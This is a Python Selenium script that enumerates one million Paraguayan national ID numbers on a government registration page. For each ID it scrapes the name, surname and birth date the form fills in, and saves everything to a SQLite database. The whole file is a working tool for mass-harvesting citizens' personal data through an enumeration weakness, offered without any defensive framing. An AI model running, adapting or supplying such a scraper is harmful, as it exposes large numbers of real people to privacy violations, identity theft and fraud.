import selenium
import time
import sqlite3
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

# Create a database connection to a SQLite database and a cursor, which is necessary to execute SQL commands 

conn = sqlite3.connect('paraguayos.db')
c = conn.cursor()

# Create table - only run this once!

c.execute('''CREATE TABLE IF NOT EXISTS paraguayos
                (cedula text, nombres text, apellidos text, dia integer, mes integer, anho integer)''')

# Create a new instance of the Chrome driver

driver = webdriver.Chrome(ChromeDriverManager().install())

# Go to the website

search_url = "https://identidad.mtess.gov.py/alumno/register.php"

driver.get(search_url)

time.sleep(3)

elem = driver.find_element(By.NAME, "value_cedula_1")

for cedula in range(4000000,5000000):
    print("Procesando cedula: " + str(cedula))
    elem.clear()
    elem.send_keys(cedula)
    elem.send_keys(Keys.TAB)

    time.sleep(1)

    elem2 = driver.find_element(By.ID, "readonly_value_nombre_1")
    nombres = elem2.get_attribute("value")

    if(nombres != "noencontrada"):
        elem3 = driver.find_element(By.ID, "readonly_value_apellido_1")
        elem4 = driver.find_element(By.ID, "dayvalue_fechanac_1")
        elem5 = driver.find_element(By.ID, "monthvalue_fechanac_1")
        elem6 = driver.find_element(By.ID, "yearvalue_fechanac_1")

        apellidos = elem3.get_property("value")
        dia = elem4.get_property("value")
        mes = elem5.get_property("value")
        anho = elem6.get_property("value")

        # Insert a row of data
        c.execute("INSERT INTO paraguayos VALUES (?, ?, ?, ?, ?, ?)", (cedula, nombres, apellidos, dia, mes, anho))

        # Save (commit) the changes
        conn.commit()

        time.sleep(1)


# We can also close the connection if we are done with it.
# Just be sure any changes have been committed or they will be lost.
conn.close()

driver.quit()

#The script is pretty straightforward. It opens the website, enters the cedula, and then grabs the data from the fields. It then inserts the data into a SQLite database.
